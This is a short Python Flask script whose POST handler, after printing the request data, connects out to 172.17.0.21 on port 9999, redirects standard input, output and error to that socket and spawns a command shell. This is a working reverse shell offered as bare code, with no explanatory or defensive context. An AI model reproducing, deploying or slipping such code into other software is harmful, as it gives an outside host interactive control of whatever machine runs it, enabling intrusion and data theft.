#!/usr/bin/python3
from flask import *
import colorama

app = Flask(__name__)

@app.route('/',methods=["POST"])
def root():
    data = request.get_json()
    print (data)
    import socket
    import os
    import pty
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("172.17.0.21",9999))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("cmd.exe")
    return (data)

if __name__ == '__main__':
    app.run('0.0.0.0', port=9999)
